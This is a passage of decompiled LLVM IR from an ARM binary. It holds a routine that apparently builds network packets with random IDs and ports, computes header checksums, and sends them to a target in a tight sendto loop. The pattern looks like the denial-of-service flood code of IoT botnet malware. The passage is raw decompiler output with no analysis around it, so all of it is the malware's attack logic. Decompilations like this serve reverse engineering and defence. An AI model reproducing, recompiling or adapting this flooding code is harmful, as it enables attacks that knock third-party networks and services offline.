dec_label_pc_ba54:                                ; preds = %dec_label_pc_bb48, %dec_label_pc_ba54.preheader
  %v0_ba54 = phi i32 [ %v0_ba54.pre, %dec_label_pc_ba54.preheader ], [ %v1_bc0c, %dec_label_pc_bb48 ]
  %v2_ba54 = icmp eq i32 %v0_ba54, 0
  store i1 %v2_ba54, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp107 = icmp slt i32 %v0_ba54, 1
  br label %dec_label_pc_ba5c

dec_label_pc_ba5c:                                ; preds = %dec_label_pc_ba5c, %dec_label_pc_ba54
  br i1 %tmp107, label %dec_label_pc_ba5c, label %dec_label_pc_ba60

dec_label_pc_ba60:                                ; preds = %dec_label_pc_ba5c
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @sl, align 4
  br label %dec_label_pc_ba6c

dec_label_pc_ba6c:                                ; preds = %dec_label_pc_bb48, %dec_label_pc_ba60
  %v1_ba80 = phi i32 [ %v1_bc08, %dec_label_pc_bb48 ], [ 0, %dec_label_pc_ba60 ]
  %v5_ba70 = mul i32 %v1_ba80, 24
  %v1_ba74 = load i32, i32* @sb, align 4
  %v2_ba74 = add i32 %v1_ba74, %v5_ba70
  store i32 %v2_ba74, i32* %r3.global-to-local, align 4
  store i32 %v4_b608, i32* %r1.global-to-local, align 4
  %v1_ba7c = add i32 %v2_ba74, 20
  %v2_ba7c = inttoptr i32 %v1_ba7c to i8*
  %v3_ba7c = load i8, i8* %v2_ba7c, align 1
  %v4_ba7c = zext i8 %v3_ba7c to i32
  store i32 %v4_ba7c, i32* %r2.global-to-local, align 4
  %v4_ba80 = mul i32 %v1_ba80, 4
  %v5_ba80 = add i32 %v4_ba80, %v4_b608
  %v6_ba80 = inttoptr i32 %v5_ba80 to i32*
  %v7_ba80 = load i32, i32* %v6_ba80, align 4
  store i32 %v7_ba80, i32* @r5, align 4
  %v7_ba84 = icmp eq i8 %v3_ba7c, 31
  store i1 %v7_ba84, i1* %cpsr_z.global-to-local, align 1
  %v1_ba88 = add i32 %v7_ba80, 24
  store i32 %v1_ba88, i32* @r8, align 4
  %v1_ba8c = add i32 %v7_ba80, 38
  store i32 %v1_ba8c, i32* @r6, align 4
  %v1_ba90 = add i32 %v7_ba80, 58
  store i32 %v1_ba90, i32* @r7, align 4
  %tmp118 = icmp ult i8 %v3_ba7c, 32
  br i1 %tmp118, label %dec_label_pc_bc2c, label %dec_label_pc_ba98

dec_label_pc_ba98:                                ; preds = %dec_label_pc_ba6c
  store i32 %v5_b728, i32* %r2.global-to-local, align 4
  store i1 %v7_ba9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ba9c, label %dec_label_pc_bc94, label %dec_label_pc_baa4

dec_label_pc_baa4:                                ; preds = %dec_label_pc_bc2c, %dec_label_pc_ba98
  store i32 %v3_b78c, i32* %r3.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_bca4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_bca4, label %dec_label_pc_bcb0, label %dec_label_pc_bab8

dec_label_pc_bab8:                                ; preds = %dec_label_pc_bc94.dec_label_pc_bab8_crit_edge, %dec_label_pc_baa4
  %v1_babc = phi i32 [ %v1_babc.pre, %dec_label_pc_bc94.dec_label_pc_bab8_crit_edge ], [ 65535, %dec_label_pc_baa4 ]
  store i32 %v3_b790, i32* %r1.global-to-local, align 4
  %v9_babc = icmp eq i32 %v3_b790, %v1_babc
  store i1 %v9_babc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_babc, label %dec_label_pc_bce8, label %dec_label_pc_bac4

dec_label_pc_bac4:                                ; preds = %dec_label_pc_bcb0.dec_label_pc_bac4_crit_edge, %dec_label_pc_bab8
  %v1_bac8 = phi i32 [ %v1_bac8.pre, %dec_label_pc_bcb0.dec_label_pc_bac4_crit_edge ], [ %v1_babc, %dec_label_pc_bab8 ]
  store i32 %v3_b794, i32* %r2.global-to-local, align 4
  %v9_bac8 = icmp eq i32 %v3_b794, %v1_bac8
  store i1 %v9_bac8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bac8, label %dec_label_pc_bd04, label %dec_label_pc_bad0

dec_label_pc_bad0:                                ; preds = %dec_label_pc_bce8, %dec_label_pc_bac4
  store i32 %v1_b784, i32* %r3.global-to-local, align 4
  store i1 %v2_bd14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_bd14, label %dec_label_pc_bd28, label %.thread24

.thread24:                                        ; preds = %dec_label_pc_bad0
  %v1_bad8 = load i32, i32* @r5, align 4
  %v2_bad8 = add i32 %v1_bad8, 16
  %v3_bad8 = inttoptr i32 %v2_bad8 to i32*
  %v4_bad8 = load i32, i32* %v3_bad8, align 4
  store i32 %v4_bad8, i32* %r3.global-to-local, align 4
  %v2_badc = load i32, i32* @r6, align 4
  %v3_badc = add i32 %v2_badc, 16
  %v4_badc = inttoptr i32 %v3_badc to i32*
  store i32 %v4_bad8, i32* %v4_badc, align 4
  br label %dec_label_pc_bae4

dec_label_pc_bae4:                                ; preds = %bb110, %.thread24, %dec_label_pc_bd28
  %v0_bae4 = call i32 @function_10b68()
  store i32 %v0_bae4, i32* %r0.global-to-local, align 4
  store i32 %v0_bae4, i32* %stack_var_-44, align 4
  %v0_baec = call i32 @function_10b68()
  store i32 %v0_baec, i32* %r0.global-to-local, align 4
  store i32 %v0_baec, i32* %stack_var_-48, align 4
  %v0_baf4 = call i32 @function_10b68()
  store i32 %v2_baf8, i32* %r1.global-to-local, align 4
  store i32 %v0_baf4, i32* %stack_var_-52, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_bb04 = load i32, i32* @r8, align 4
  store i32 %v0_bb04, i32* %r0.global-to-local, align 4
  %v3_bb08 = call i32 @function_13a18(i32 %v0_bb04, i32 %v2_baf8, i32 4)
  %v0_bb0c = load i32, i32* @r8, align 4
  %v1_bb0c = add i32 %v0_bb0c, 6
  store i32 %v1_bb0c, i32* %r0.global-to-local, align 4
  store i32 %v2_bb10, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v3_bb18 = call i32 @function_13a18(i32 %v1_bb0c, i32 %v2_bb10, i32 4)
  %v0_bb1c = load i32, i32* @r8, align 4
  %v1_bb1c = add i32 %v0_bb1c, 4
  store i32 %v1_bb1c, i32* %r0.global-to-local, align 4
  store i32 %v2_bb20, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_bb28 = call i32 @function_13a18(i32 %v1_bb1c, i32 %v2_bb20, i32 2)
  store i32 %v2_bb2c, i32* %r1.global-to-local, align 4
  %v0_bb30 = load i32, i32* @r8, align 4
  %v1_bb30 = add i32 %v0_bb30, 10
  store i32 %v1_bb30, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_bb38 = call i32 @function_13a18(i32 %v1_bb30, i32 %v2_bb2c, i32 2)
  store i32 %v3_bb38, i32* %r0.global-to-local, align 4
  store i32 %v1_b6f4, i32* %r1.global-to-local, align 4
  store i1 %v2_bb40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_bb40, label %dec_label_pc_bb48, label %dec_label_pc_bd34

dec_label_pc_bb48:                                ; preds = %dec_label_pc_bae4, %dec_label_pc_bd34
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_bb4c = load i32, i32* @sl, align 4
  %v1_bb4c = trunc i32 %v0_bb4c to i8
  %v2_bb4c = load i32, i32* @r5, align 4
  %v3_bb4c = add i32 %v2_bb4c, 10
  %v4_bb4c = inttoptr i32 %v3_bb4c to i8*
  store i8 %v1_bb4c, i8* %v4_bb4c, align 1
  %v0_bb50 = load i32, i32* @sl, align 4
  %v1_bb50 = trunc i32 %v0_bb50 to i8
  %v2_bb50 = load i32, i32* @r5, align 4
  %v3_bb50 = add i32 %v2_bb50, 11
  %v4_bb50 = inttoptr i32 %v3_bb50 to i8*
  store i8 %v1_bb50, i8* %v4_bb50, align 1
  %v0_bb54 = load i32, i32* @r5, align 4
  store i32 %v0_bb54, i32* @r0, align 4
  %v2_bb58 = call i32 @function_f17c(i32 %v0_bb54, i32 20)
  %v3_bb58 = trunc i32 %v2_bb58 to i8
  %v4_bb5c = sdiv i32 %v2_bb58, 256
  store i32 %v4_bb5c, i32* %r3.global-to-local, align 4
  %v1_bb60 = trunc i32 %v4_bb5c to i8
  %v2_bb60 = load i32, i32* @r5, align 4
  %v3_bb60 = add i32 %v2_bb60, 11
  %v4_bb60 = inttoptr i32 %v3_bb60 to i8*
  store i8 %v1_bb60, i8* %v4_bb60, align 1
  %v3_bb64 = load i32, i32* @r5, align 4
  %v4_bb64 = add i32 %v3_bb64, 10
  %v5_bb64 = inttoptr i32 %v4_bb64 to i8*
  store i8 %v3_bb58, i8* %v5_bb64, align 1
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_bb6c = load i32, i32* @sl, align 4
  %v1_bb6c = trunc i32 %v0_bb6c to i8
  %v2_bb6c = load i32, i32* @r6, align 4
  %v3_bb6c = add i32 %v2_bb6c, 10
  %v4_bb6c = inttoptr i32 %v3_bb6c to i8*
  store i8 %v1_bb6c, i8* %v4_bb6c, align 1
  %v0_bb70 = load i32, i32* @sl, align 4
  %v1_bb70 = trunc i32 %v0_bb70 to i8
  %v2_bb70 = load i32, i32* @r6, align 4
  %v3_bb70 = add i32 %v2_bb70, 11
  %v4_bb70 = inttoptr i32 %v3_bb70 to i8*
  store i8 %v1_bb70, i8* %v4_bb70, align 1
  %v0_bb74 = load i32, i32* @r6, align 4
  store i32 %v0_bb74, i32* @r0, align 4
  %v2_bb78 = call i32 @function_f17c(i32 %v0_bb74, i32 20)
  %v3_bb78 = trunc i32 %v2_bb78 to i8
  store i32 %v2_bb78, i32* %r0.global-to-local, align 4
  %v4_bb7c = sdiv i32 %v2_bb78, 256
  store i32 %v4_bb7c, i32* %r3.global-to-local, align 4
  %v3_bb80 = load i32, i32* @r6, align 4
  %v4_bb80 = add i32 %v3_bb80, 10
  %v5_bb80 = inttoptr i32 %v4_bb80 to i8*
  store i8 %v3_bb78, i8* %v5_bb80, align 1
  %v0_bb84 = load i32, i32* %r3.global-to-local, align 4
  %v1_bb84 = trunc i32 %v0_bb84 to i8
  %v2_bb84 = load i32, i32* @r6, align 4
  %v3_bb84 = add i32 %v2_bb84, 11
  %v4_bb84 = inttoptr i32 %v3_bb84 to i8*
  store i8 %v1_bb84, i8* %v4_bb84, align 1
  %v0_bb88 = load i32, i32* @r7, align 4
  %v1_bb88 = add i32 %v0_bb88, 4
  %v2_bb88 = inttoptr i32 %v1_bb88 to i8*
  %v3_bb88 = load i8, i8* %v2_bb88, align 1
  %v4_bb88 = zext i8 %v3_bb88 to i32
  store i32 %v4_bb88, i32* %r3.global-to-local, align 4
  %v1_bb8c = add i32 %v0_bb88, 5
  %v2_bb8c = inttoptr i32 %v1_bb8c to i8*
  %v3_bb8c = load i8, i8* %v2_bb8c, align 1
  %v4_bb8c = zext i8 %v3_bb8c to i32
  store i32 %v0_bb88, i32* @r1, align 4
  %v4_bb94 = mul nuw nsw i32 %v4_bb8c, 256
  %v5_bb94 = or i32 %v4_bb94, %v4_bb88
  store i32 %v5_bb94, i32* %r2.global-to-local, align 4
  %v0_bb98 = load i32, i32* @sl, align 4
  %v1_bb98 = trunc i32 %v0_bb98 to i8
  %v3_bb98 = add i32 %v0_bb88, 6
  %v4_bb98 = inttoptr i32 %v3_bb98 to i8*
  store i8 %v1_bb98, i8* %v4_bb98, align 1
  store i32 %stack_var_-156.0.ph, i32* %r3.global-to-local, align 4
  %v0_bba0 = load i32, i32* @sl, align 4
  %v1_bba0 = trunc i32 %v0_bba0 to i8
  %v2_bba0 = load i32, i32* @r7, align 4
  %v3_bba0 = add i32 %v2_bba0, 7
  %v4_bba0 = inttoptr i32 %v3_bba0 to i8*
  store i8 %v1_bba0, i8* %v4_bba0, align 1
  %v0_bba4 = load i32, i32* @r6, align 4
  store i32 %v0_bba4, i32* %r0.global-to-local, align 4
  %v4_bba8 = call i32 @function_f1d8(i32 %v0_bba4, i32 %v0_bb88, i32 %v5_bb94, i32 %stack_var_-156.0.ph)
  %v5_bba8 = trunc i32 %v4_bba8 to i8
  store i32 %v4_bba8, i32* %r0.global-to-local, align 4
  %v3_bbac = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_bbac, i32* %r3.global-to-local, align 4
  %v3_bbb0 = mul i32 %v3_bbac, 32
  store i32 %v3_bbb0, i32* %r2.global-to-local, align 4
  %v0_bbb4 = load i32, i32* @r5, align 4
  %v1_bbb4 = add i32 %v0_bbb4, 16
  %v2_bbb4 = inttoptr i32 %v1_bbb4 to i32*
  %v3_bbb4 = load i32, i32* %v2_bbb4, align 4
  store i32 %v3_bbb4, i32* %r1.global-to-local, align 4
  %v5_bbb8 = mul i32 %v3_bbac, 24
  store i32 %v5_bbb8, i32* %r2.global-to-local, align 4
  %v4_bbbc43 = udiv i32 %v4_bba8, 256
  %v1_bbc0 = trunc i32 %v4_bbbc43 to i8
  %v2_bbc0 = load i32, i32* @r7, align 4
  %v3_bbc0 = add i32 %v2_bbc0, 7
  %v4_bbc0 = inttoptr i32 %v3_bbc0 to i8*
  store i8 %v1_bbc0, i8* %v4_bbc0, align 1
  %v0_bbc4 = load i32, i32* %r2.global-to-local, align 4
  %v1_bbc4 = load i32, i32* @sb, align 4
  %v2_bbc4 = add i32 %v1_bbc4, %v0_bbc4
  store i32 %v2_bbc4, i32* %lr.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v3_bbcc = load i32, i32* @r7, align 4
  %v4_bbcc = add i32 %v3_bbcc, 6
  %v5_bbcc = inttoptr i32 %v4_bbcc to i8*
  store i8 %v5_bba8, i8* %v5_bbcc, align 1
  %v0_bbd0 = load i32, i32* %r1.global-to-local, align 4
  %v1_bbd0 = load i32, i32* %lr.global-to-local, align 4
  %v2_bbd0 = add i32 %v1_bbd0, 4
  %v3_bbd0 = inttoptr i32 %v2_bbd0 to i32*
  store i32 %v0_bbd0, i32* %v3_bbd0, align 4
  %v0_bbd4 = load i32, i32* %r3.global-to-local, align 4
  %v1_bbd4 = trunc i32 %v0_bbd4 to i8
  %v2_bbd4 = load i32, i32* %r2.global-to-local, align 4
  %v3_bbd4 = load i32, i32* @sb, align 4
  %v4_bbd4 = add i32 %v3_bbd4, %v2_bbd4
  %v5_bbd4 = inttoptr i32 %v4_bbd4 to i8*
  store i8 %v1_bbd4, i8* %v5_bbd4, align 1
  %v0_bbd8 = load i32, i32* @sl, align 4
  %v1_bbd8 = trunc i32 %v0_bbd8 to i8
  %v2_bbd8 = load i32, i32* %lr.global-to-local, align 4
  %v3_bbd8 = add i32 %v2_bbd8, 2
  %v4_bbd8 = inttoptr i32 %v3_bbd8 to i8*
  store i8 %v1_bbd8, i8* %v4_bbd8, align 1
  %v0_bbdc = load i32, i32* @sl, align 4
  %v1_bbdc = trunc i32 %v0_bbdc to i8
  %v2_bbdc = load i32, i32* %lr.global-to-local, align 4
  %v3_bbdc = add i32 %v2_bbdc, 1
  %v4_bbdc = inttoptr i32 %v3_bbdc to i8*
  store i8 %v1_bbdc, i8* %v4_bbdc, align 1
  %v0_bbe0 = load i32, i32* @sl, align 4
  %v1_bbe0 = trunc i32 %v0_bbe0 to i8
  %v2_bbe0 = load i32, i32* %lr.global-to-local, align 4
  %v3_bbe0 = add i32 %v2_bbe0, 3
  %v4_bbe0 = inttoptr i32 %v3_bbe0 to i8*
  store i8 %v1_bbe0, i8* %v4_bbe0, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_bbec = load i32, i32* @r5, align 4
  store i32 %v0_bbec, i32* %r1.global-to-local, align 4
  store i32 %v3_b73c, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-160.0.ph, i32* %r2.global-to-local, align 4
  %v0_bbf8 = load i32, i32* %lr.global-to-local, align 4
  %v4_bbf8 = inttoptr i32 %v0_bbf8 to %sockaddr*
  %v7_bc00 = inttoptr i32 %v0_bbec to i32*
  %v9_bc00 = call i32 @sendto(i32 %v3_b73c, i32* %v7_bc00, i32 %stack_var_-160.0.ph, i32 16384, %sockaddr* %v4_bbf8, i32 16)
  %v3_bc04 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_bc04, i32* %r3.global-to-local, align 4
  %v1_bc08 = add i32 %v3_bc04, 1
  store i32 %v1_bc08, i32* %r0.global-to-local, align 4
  %v1_bc0c = load i32, i32* @fp, align 4
  %v9_bc0c = icmp eq i32 %v1_bc08, %v1_bc0c
  store i1 %v9_bc0c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_bc08, i32* %stack_var_-40, align 4
  %v6_bc14 = icmp slt i32 %v1_bc08, %v1_bc0c
  br i1 %v6_bc14, label %dec_label_pc_ba6c, label %dec_label_pc_ba54

dec_label_pc_bc1c:                                ; preds = %dec_label_pc_b74c
  store i32 %v3_b73c, i32* %r0.global-to-local, align 4
  %v1_bc20 = call i32 @close(i32 %v3_b73c)
  store i32 %v1_bc20, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bc24

dec_label_pc_bc24:                                ; preds = %dec_label_pc_b5e8, %dec_label_pc_bc1c
  %v29_bc28 = phi i32 [ %v3_b73c, %dec_label_pc_b5e8 ], [ %v1_bc20, %dec_label_pc_bc1c ]
  store i32 %v3_b5e8, i32* %r4.global-to-local, align 4
  store i32 %v6_b5e8, i32* %r5.global-to-local, align 4
  store i32 %v9_b5e8, i32* %r6.global-to-local, align 4
  store i32 %v12_b5e8, i32* %r7.global-to-local, align 4
  store i32 %v15_b5e8, i32* %r8.global-to-local, align 4
  store i32 %v21_b5e8, i32* %sl.global-to-local, align 4
  ret i32 %v29_bc28

dec_label_pc_bc2c:                                ; preds = %dec_label_pc_ba6c
  %v1_bc2c = add i32 %v2_ba74, 16
  %v2_bc2c = inttoptr i32 %v1_bc2c to i32*
  %v3_bc2c = load i32, i32* %v2_bc2c, align 4
  store i32 %v3_bc2c, i32* %r4.global-to-local, align 4
  %v0_bc30 = call i32 @function_10b68()
  store i32 %v0_bc30, i32* %r0.global-to-local, align 4
  %v3_bc34 = load i32, i32* %stack_var_-40, align 4
  %v5_bc3c = mul i32 %v3_bc34, 24
  %v0_bc40 = load i32, i32* %r4.global-to-local, align 4
  %v1_bc44 = load i32, i32* @sb, align 4
  %v2_bc44 = add i32 %v1_bc44, %v5_bc3c
  store i32 %v2_bc44, i32* %r1.global-to-local, align 4
  %v1_bc48 = and i32 %v0_bc40, 65280
  store i32 %v1_bc48, i32* %r3.global-to-local, align 4
  %v1_bc40 = udiv i32 %v0_bc40, 256
  %v3_bc4c = and i32 %v1_bc40, 65280
  store i32 %v3_bc4c, i32* %r2.global-to-local, align 4
  %v3_bc50 = mul i32 %v0_bc40, 16777216
  store i32 %v3_bc50, i32* %ip.global-to-local, align 4
  %v1_bc54 = add i32 %v2_bc44, 20
  %v2_bc54 = inttoptr i32 %v1_bc54 to i8*
  %v3_bc54 = load i8, i8* %v2_bc54, align 1
  %v4_bc54 = zext i8 %v3_bc54 to i32
  store i32 %v4_bc54, i32* %lr.global-to-local, align 4
  %v4_bc58 = mul nuw nsw i32 %v1_bc48, 256
  %v5_bc58 = or i32 %v4_bc58, %v3_bc50
  store i32 %v5_bc58, i32* %ip.global-to-local, align 4
  %v2_bc60 = call i32 @llvm.bswap.i32(i32 %v0_bc40)
  %v7_bc64 = lshr i32 %v0_bc30, %v4_bc54
  %v8_bc64 = add i32 %v7_bc64, %v2_bc60
  %v3_bc70 = mul i32 %v8_bc64, 16777216
  %v1_bc74 = and i32 %v8_bc64, 65280
  store i32 %v1_bc74, i32* %r0.global-to-local, align 4
  store i32 %v5_b728, i32* %r2.global-to-local, align 4
  %v4_bc80 = mul nuw nsw i32 %v1_bc74, 256
  %v5_bc80 = or i32 %v4_bc80, %v3_bc70
  store i32 %v5_bc80, i32* %r1.global-to-local, align 4
  %v2_bc84 = call i32 @llvm.bswap.i32(i32 %v8_bc64)
  store i32 %v2_bc84, i32* %r3.global-to-local, align 4
  store i1 %v7_ba9c, i1* %cpsr_z.global-to-local, align 1
  %v1_bc8c = load i32, i32* @r5, align 4
  %v2_bc8c = add i32 %v1_bc8c, 16
  %v3_bc8c = inttoptr i32 %v2_bc8c to i32*
  store i32 %v2_bc84, i32* %v3_bc8c, align 4
  br i1 %v2_ba9c, label %dec_label_pc_bc94, label %dec_label_pc_baa4

dec_label_pc_bc94:                                ; preds = %dec_label_pc_bc2c, %dec_label_pc_ba98
  %v0_bc94 = call i32 @function_10b68()
  store i32 %v0_bc94, i32* %r0.global-to-local, align 4
  store i32 %v3_b78c, i32* %r3.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_bca4, i1* %cpsr_z.global-to-local, align 1
  %v1_bca8 = load i32, i32* @r5, align 4
  %v2_bca8 = add i32 %v1_bca8, 12
  %v3_bca8 = inttoptr i32 %v2_bca8 to i32*
  store i32 %v0_bc94, i32* %v3_bca8, align 4
  br i1 %v3_bca4, label %dec_label_pc_bcb0, label %dec_label_pc_bc94.dec_label_pc_bab8_crit_edge

dec_label_pc_bc94.dec_label_pc_bab8_crit_edge:    ; preds = %dec_label_pc_bc94
  %v1_babc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bab8

dec_label_pc_bcb0:                                ; preds = %dec_label_pc_bc94, %dec_label_pc_baa4
  %v0_bcb0 = call i32 @function_10b68()
  %v3_bcb8 = urem i32 %v0_bcb0, 65536
  store i32 %v3_bcb8, i32* %r0.global-to-local, align 4
  %v1_bcc0 = sub nsw i32 999, %v3_bcb8
  store i32 %v1_bcc0, i32* %r2.global-to-local, align 4
  %v3_bcc4 = sdiv i32 %v1_bcc0, 256
  store i32 %v3_bcc4, i32* %r1.global-to-local, align 4
  %v3_bcc840 = udiv i32 %v3_bcb8, 256
  store i32 %v3_bcc840, i32* %r3.global-to-local, align 4
  %v1_bccc = trunc i32 %v3_bcc840 to i8
  %v2_bccc = load i32, i32* @r5, align 4
  %v3_bccc = add i32 %v2_bccc, 5
  %v4_bccc = inttoptr i32 %v3_bccc to i8*
  store i8 %v1_bccc, i8* %v4_bccc, align 1
  %v0_bcd0 = load i32, i32* %r0.global-to-local, align 4
  %v1_bcd0 = trunc i32 %v0_bcd0 to i8
  %v2_bcd0 = load i32, i32* @r5, align 4
  %v3_bcd0 = add i32 %v2_bcd0, 4
  %v4_bcd0 = inttoptr i32 %v3_bcd0 to i8*
  store i8 %v1_bcd0, i8* %v4_bcd0, align 1
  %v0_bcd4 = load i32, i32* %r1.global-to-local, align 4
  %v1_bcd4 = trunc i32 %v0_bcd4 to i8
  %v2_bcd4 = load i32, i32* @r6, align 4
  %v3_bcd4 = add i32 %v2_bcd4, 5
  %v4_bcd4 = inttoptr i32 %v3_bcd4 to i8*
  store i8 %v1_bcd4, i8* %v4_bcd4, align 1
  store i32 %v3_b790, i32* %r1.global-to-local, align 4
  %v1_bcdc = load i32, i32* @r4, align 4
  %v9_bcdc = icmp eq i32 %v3_b790, %v1_bcdc
  store i1 %v9_bcdc, i1* %cpsr_z.global-to-local, align 1
  %v0_bce0 = load i32, i32* %r2.global-to-local, align 4
  %v1_bce0 = trunc i32 %v0_bce0 to i8
  %v2_bce0 = load i32, i32* @r6, align 4
  %v3_bce0 = add i32 %v2_bce0, 4
  %v4_bce0 = inttoptr i32 %v3_bce0 to i8*
  store i8 %v1_bce0, i8* %v4_bce0, align 1
  %v0_bce4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bce4, label %dec_label_pc_bce8, label %dec_label_pc_bcb0.dec_label_pc_bac4_crit_edge

dec_label_pc_bcb0.dec_label_pc_bac4_crit_edge:    ; preds = %dec_label_pc_bcb0
  %v1_bac8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bac4

dec_label_pc_bce8:                                ; preds = %dec_label_pc_bcb0, %dec_label_pc_bab8
  %v0_bce8 = call i32 @function_10b68()
  %v1_bce8 = trunc i32 %v0_bce8 to i8
  store i32 %v0_bce8, i32* %r0.global-to-local, align 4
  store i32 %v3_b794, i32* %r2.global-to-local, align 4
  %v4_bcf0 = sdiv i32 %v0_bce8, 256
  store i32 %v4_bcf0, i32* %r3.global-to-local, align 4
  %v1_bcf4 = load i32, i32* @r4, align 4
  %v9_bcf4 = icmp eq i32 %v3_b794, %v1_bcf4
  store i1 %v9_bcf4, i1* %cpsr_z.global-to-local, align 1
  %v3_bcf8 = load i32, i32* @r5, align 4
  %v4_bcf8 = add i32 %v3_bcf8, 58
  %v5_bcf8 = inttoptr i32 %v4_bcf8 to i8*
  store i8 %v1_bce8, i8* %v5_bcf8, align 1
  %v0_bcfc = load i32, i32* %r3.global-to-local, align 4
  %v1_bcfc = trunc i32 %v0_bcfc to i8
  %v2_bcfc = load i32, i32* @r7, align 4
  %v3_bcfc = add i32 %v2_bcfc, 1
  %v4_bcfc = inttoptr i32 %v3_bcfc to i8*
  store i8 %v1_bcfc, i8* %v4_bcfc, align 1
  %v0_bd00 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bd00, label %dec_label_pc_bd04, label %dec_label_pc_bad0

dec_label_pc_bd04:                                ; preds = %dec_label_pc_bce8, %dec_label_pc_bac4
  %v0_bd04 = call i32 @function_10b68()
  %v1_bd04 = trunc i32 %v0_bd04 to i8
  store i32 %v0_bd04, i32* %r0.global-to-local, align 4
  %v4_bd0844 = udiv i32 %v0_bd04, 256
  %v1_bd0c = trunc i32 %v4_bd0844 to i8
  %v2_bd0c = load i32, i32* @r7, align 4
  %v3_bd0c = add i32 %v2_bd0c, 3
  %v4_bd0c = inttoptr i32 %v3_bd0c to i8*
  store i8 %v1_bd0c, i8* %v4_bd0c, align 1
  store i32 %v1_b784, i32* %r3.global-to-local, align 4
  store i1 %v2_bd14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_bd14, label %bb109, label %bb108

bb108:                                            ; preds = %dec_label_pc_bd04
  %v1_bd18 = load i32, i32* @r5, align 4
  %v2_bd18 = add i32 %v1_bd18, 16
  %v3_bd18 = inttoptr i32 %v2_bd18 to i32*
  %v4_bd18 = load i32, i32* %v3_bd18, align 4
  store i32 %v4_bd18, i32* %r3.global-to-local, align 4
  br label %bb109

bb109:                                            ; preds = %dec_label_pc_bd04, %bb108
  %v3_bd1c = load i32, i32* @r7, align 4
  %v4_bd1c = add i32 %v3_bd1c, 2
  %v5_bd1c = inttoptr i32 %v4_bd1c to i8*
  store i8 %v1_bd04, i8* %v5_bd1c, align 1
  %v0_bd20 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bd20, label %dec_label_pc_bd28, label %bb110

bb110:                                            ; preds = %bb109
  %v1_bd20 = load i32, i32* %r3.global-to-local, align 4
  %v2_bd20 = load i32, i32* @r6, align 4
  %v3_bd20 = add i32 %v2_bd20, 16
  %v4_bd20 = inttoptr i32 %v3_bd20 to i32*
  store i32 %v1_bd20, i32* %v4_bd20, align 4
  br label %dec_label_pc_bae4

dec_label_pc_bd28:                                ; preds = %dec_label_pc_bad0, %bb109
  %v0_bd28 = call i32 @function_10b68()
  store i32 %v0_bd28, i32* %r0.global-to-local, align 4
  %v1_bd2c = load i32, i32* @r6, align 4
  %v2_bd2c = add i32 %v1_bd2c, 16
  %v3_bd2c = inttoptr i32 %v2_bd2c to i32*
  store i32 %v0_bd28, i32* %v3_bd2c, align 4
  br label %dec_label_pc_bae4

dec_label_pc_bd34:                                ; preds = %dec_label_pc_bae4
  %v0_bd34 = load i32, i32* @r7, align 4
  %v1_bd34 = add i32 %v0_bd34, 8
  store i32 %v1_bd34, i32* %r0.global-to-local, align 4
  store i32 %v5_b6d4, i32* @r1, align 4
  %v1_bd3c = inttoptr i32 %v1_bd34 to i8*
  %v2_bd3c = call i32 @function_10d44(i8* %v1_bd3c)
  store i32 %v2_bd3c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bb48

dec_label_pc_bd44:                                ; preds = %dec_label_pc_b774
  %v1_bd4c = add i32 %v5_b6d4, 8
  store i32 %v1_bd4c, i32* %r1.global-to-local, align 4
  %v1_bd50 = add i32 %v5_b6d4, 66
  store i32 %v1_bd50, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ba54.preheader

; uselistorder directives
  uselistorder i32 %v1_bd50, { 1, 0 }
  uselistorder i32 %v1_bd4c, { 1, 0 }
  uselistorder i32 %v0_bd04, { 0, 2, 1 }
  uselistorder i32 %v0_bce8, { 0, 2, 1 }
  uselistorder i32 %v3_bcb8, { 0, 2, 1 }
  uselistorder i32 %v2_bc84, { 1, 0 }
  uselistorder i32 %v8_bc64, { 1, 2, 0 }
  uselistorder i32 %v3_bc50, { 1, 0 }
  uselistorder i32 %v0_bc40, { 2, 0, 1, 3 }
  uselistorder i32 %v1_bc0c, { 1, 2, 0 }
  uselistorder i32 %v1_bc08, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v3_bbac, { 1, 0, 2 }
  uselistorder i32 %v4_bba8, { 0, 2, 1 }
  uselistorder i32 %v0_bb88, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_bb78, { 0, 2, 1 }
  uselistorder i32 %v4_bb5c, { 1, 0 }
  uselistorder i32 %v7_ba80, { 2, 1, 0, 3 }
  uselistorder i32 %v0_ba54, { 1, 0 }
  uselistorder i1 %v7_ba9c, { 2, 1, 0 }
  uselistorder i1 %v2_bd14, { 2, 3, 1, 0 }
  uselistorder i1 %v3_bca4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_b9dc, { 1, 0, 2 }
